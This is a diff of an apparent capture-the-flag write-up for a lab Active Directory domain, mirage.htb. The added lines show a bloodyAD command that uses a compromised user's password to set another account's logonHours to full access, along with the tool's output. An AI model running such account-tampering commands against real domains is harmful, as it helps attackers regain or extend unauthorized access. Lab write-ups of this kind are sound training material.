@@ -702,6 +702,15 @@ Clock skew detected. Adjusting local time by 7:00:00.454367. Retrying operation.
 This has re enable the account
 
 ```python
+❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object 'javier.mmarshall' logonhours -v '////////////////////////////' --b64
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+Clock skew detected. Adjusting local time by 7:00:00.332154. Retrying operation.
+[+] javier.mmarshall's logonHours has been updated
+```
+
+This also sets his account to full logon hours
+
+```python
 
 ```
 
